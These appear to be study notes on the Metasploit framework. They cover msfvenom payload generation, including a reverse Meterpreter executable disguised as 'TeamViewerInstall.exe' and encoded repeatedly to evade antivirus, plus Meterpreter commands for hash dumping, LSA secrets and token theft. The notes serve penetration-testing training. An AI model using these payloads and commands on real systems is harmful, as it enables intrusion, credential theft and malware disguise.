# Metasploit
Find the metasploit modules in: `/usr/share/metasploit-framework/modules`
Plugins: `/usr/share/metasploit-framework/plugins/`
Scripts: `/usr/share/metasploit-framework/scripts/`

To start msfconsole without banner, use `-q`

Can use for:

    Enumeration
    Preparation
    Exploitation
    Privilege Escalation
    Post-Exploitation


Types of modules:
`Auxiliary` 	Scanning, fuzzing, sniffing, and admin capabilities. Offer extra assistance and functionality.
`Encoders` 	Ensure that payloads are intact to their destination.
`Exploits` 	Defined as modules that exploit a vulnerability that will allow for the payload delivery.
`NOPs` 	(No Operation code) Keep the payload sizes consistent across exploit attempts.
`Payloads` 	Code runs remotely and calls back to the attacker machine to establish a connection (or shell).
`Plugins` 	Additional scripts can be integrated within an assessment with msfconsole and coexist.
`Post` 	Wide array of modules to gather information, pivot deeper, etc.

### Gotta love `eternalRomance`
For example, we can try to find the EternalRomance exploit for older Windows operating systems. This could look something like this:

Don't forget the command `info`

`setg` to set a permanent until program is restarted

`setg rhosts <host>`

we can combine payloads with: [GentilKiwi's Mimikatz Plugin](https://github.com/gentilkiwi/mimikatz) 

We can use `grep` when searching for payloads. `grep meterpreter grep reverse_tcp show payloads`

`help` is available in metasploit

### Payload types:
    generic/custom 	Generic listener, multi-use
    generic/shell_bind_tcp 	Generic listener, multi-use, normal shell, TCP connection binding
    generic/shell_reverse_tcp 	Generic listener, multi-use, normal shell, reverse TCP connection
    windows/x64/exec 	Executes an arbitrary command (Windows x64)
    windows/x64/loadlibrary 	Loads an arbitrary x64 library path
    windows/x64/messagebox 	Spawns a dialog via MessageBox using a customizable title, text & icon
    windows/x64/shell_reverse_tcp 	Normal shell, single payload, reverse TCP connection
    windows/x64/shell/reverse_tcp 	Normal shell, stager + stage, reverse TCP connection
    windows/x64/shell/bind_ipv6_tcp 	Normal shell, stager + stage, IPv6 Bind TCP stager
    windows/x64/meterpreter/$ 	Meterpreter payload + varieties above
    windows/x64/powershell/$ 	Interactive PowerShell sessions + varieties above
    windows/x64/vncinject/$ 	VNC Server (Reflective Injection) + varieties above

The different encoders:
x64 	x86 	sparc 	ppc 	mips

We will always need to encode our payload according to our target architecture
`msfpayload windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 R | msfencode -b '\x00' -f perl -e x86/shikata_ga_nai`
or with `msvenom`
without encoding:
`msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b "\x00" -f perl`

w. encoding:
`msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b "\x00" -f perl -e x86/shikata_ga_nai`

read more about [shikata_ga_nai encoding](https://hatching.io/blog/metasploit-payloads2/)

we can select encoders with: `show encoders` & `set encoders`

`msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=8080 -e x86/shikata_ga_nai -f exe -o ./TeamViewerInstall.exe`

If we were to encode an executable payload only once with SGN, it would most likely be detected by most antiviruses today. Let's delve into that for a moment. Picking up msfvenom, the subscript of the Framework that deals with payload generation and Encoding schemes, we have the following input:
One better option would be to try running it through multiple iterations of the same Encoding scheme:
`msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=8080 -e x86/shikata_ga_nai -f exe -i 10 -o /root/Desktop/TeamViewerInstall.exe`

msf-virustotal that can use with an API key to analyze our payloads. However this requires free registration on virustotal. 
`msf-virustotal -k <API key> -f TeamViewerInstall.exe`

# Databases
`Databases` in msfconsole are used to keep track of the results. When dealing with more complex networks, it's to no surprise we need to store. 

### Setting up the database
`sudo service postgresql status`
`sudo systemctl start postgresql`

Initiate the database:
`sudo msfdb init`

To update the database `apt update` or `sudo msfdb init`
`sudo msfdb status` - check status

### Connect to the initiated database
`sudo msfdb run`

Reinitiate:
`msfdb reinit`
`cp /usr/share/metasploit-framework/config/database.yml ~/.msf4/`
`sudo service postgresql restart`
`msfconsole -q`

We can also use `help database` to get more information


### Furthermore, to use the databases:
We can think of Workspaces the same way we would think of folders in a project. We can segregate the different scan results, hosts, and extracted information by IP, subnet, network, or domain.
To view the current Workspace list, use the workspace command. Adding a -a or -d switch after the command, followed by the workspace's name, will either add or delete that workspace to the database.

To show workspaces: `workspace`
`workspace -a Target_1` -a (add)
`workspace Target_1`

`workspace -h` to receive help with the workspace command

### Importing Scan Results

Next, let us assume we want to import a Nmap scan of a host into our Database's Workspace to understand the target better. We can use the db_import command for this. After the import is complete, we can check the presence of the host's information in our database by using the hosts and services commands. Note that the .xml file type is preferred for db_import.

`cat Target.nmap`
`db_import Target.xml`

### Using Nmap Inside MSFconsole

Alternatively, we can use Nmap straight from msfconsole! To scan directly from the console without having to background or exit the process, use the db_nmap command.
`db_nmap -sV -sS 10.10.10.8`
`hosts`
`services`

### Data backup
`db_export -h`
This data can be imported back to msfconsole later when needed. Other commands related to data retention are the extended use of hosts, services, and the creds and loot commands.

### Hosts

The hosts command displays a database table automatically populated with the host addresses, hostnames, and other information we find about these during our scans and interactions. For example, suppose msfconsole is linked with scanner plugins that can perform service and OS detection. In that case, this information should automatically appear in the table once the scans are completed through msfconsole. Again, tools like Nessus, NexPose, or Nmap will help us in these cases.

Hosts can also be manually added as separate entries in this table. After adding our custom hosts, we can also organize the format and structure of the table, add comments, change existing information, and more.

`hosts -h`

### Services

The services command functions the same way as the previous one. It contains a table with descriptions and information on services discovered during scans or interactions. In the same way as the command above, the entries here are highly customizable.

`services -h`

### Credentials

The creds command allows you to visualize the credentials gathered during your interactions with the target host. We can also add credentials manually, match existing credentials with port specifications, add descriptions, etc.
`creds -h`

### Loot

The loot command works in conjunction with the command above to offer you an at-a-glance list of owned services and users. The loot, in this case, refers to hash dumps from different system types, namely hashes, passwd, shadow, and more.

# Plugins
Since msfconsole is community driven, there are indeed many plugins from the community
Plugins at: `/usr/share/metasploit-framework/plugins`

load module `load nessus`
`git clone https://github.com/darkoperator/Metasploit-Plugins`
`ls Metasploit-Plugins`

### MSF - Copying Plugin to MSF
`sudo cp ./Metasploit-Plugins/pentest.rb /usr/share/metasploit-framework/plugins/pentest.rb`

Popular `msfconsoleplugins`
    nMap (pre-installed) 	NexPose (pre-installed) 	Nessus (pre-installed)
    Mimikatz (pre-installed V.1) 	Stdapi (pre-installed) 	Railgun
    Priv 	Incognito (pre-installed) 	Darkoperator's

# Sessions & Jobs
`[CTRL] + [Z]` or `background` to put session in `bg`.

List sessions by `sessions`

Jobs help: `jobs -h`

### Viewing the Exploit Command Help Menu

When we run an exploit, we can run it as a job by typing exploit -j. Per the help menu for the exploit command, adding -j to our command. Instead of just exploit or run, will "run it in the context of a job."

Listing jobs: `jobs -l`

To exploit a vulnerable sudo version, create a session in metasploit and attach the session to the new exploit. 

# Meterpreter
MSF scanning target
msf6: `db_nmap -sV -p- -T5 -A 10.10.10.15`
We can thereafter query for `services` or `hosts`

We can steel tokens with `steal_token <nr>`

we can get suggestions for exploits: `post/multi/recon/local_exploit_suggester  `
We can get user id from session: `meterpreter > getuid`

### MSF - Dumping Hashes
`meterpreter > hashdump`
`lsa_dump_sam`

### MSF - Meterpreter LSA Secrets Dump
`meterpreter > lsa_dump_secrets`

From this point, if the machine was connected to a more extensive network, we could use this loot to pivot through the system, gain access to internal resources and impersonate users with a higher level of access if the overall security posture of the network is weak.
